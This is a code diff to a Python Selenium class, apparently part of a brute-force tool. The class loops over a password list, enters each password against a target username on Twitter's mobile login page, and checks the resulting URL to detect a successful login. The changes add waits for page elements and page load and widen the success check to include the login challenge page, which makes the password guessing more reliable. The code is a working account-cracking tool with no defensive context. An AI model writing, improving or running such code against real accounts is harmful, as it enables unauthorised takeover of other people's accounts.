@@ -33,8 +33,9 @@ class Twitter:
                 passwords.append(line.strip('\n'))
         for password in passwords:
             self.browser.driver.get(self.url)
-            email = self.browser.driver.find_element_by_name(
-                'session[username_or_email]')
+            email = self.browser.wait_until_element_exists('name', 'session[username_or_email]')
+            #email = self.browser.driver.find_element_by_name(
+            #    'session[username_or_email]')
             email.send_keys(self.username)
             pwd = self.browser.driver.find_element_by_name('session[password]')
             pwd.send_keys(password)
@@ -42,8 +43,10 @@ class Twitter:
             form = self.browser.driver.find_elements_by_xpath('.//form')[0]
             form.submit()
 
+            self.browser.wait_page_loaded()
+
             url = self.browser.driver.current_url
-            if 'login' not in url:
+            if url == "https://mobile.twitter.com/" or url == "https://mobile.twitter.com/home" or 'https://mobile.twitter.com/account/login_challenge' in url:
                 found = password
                 break
             time.sleep(self.delay)
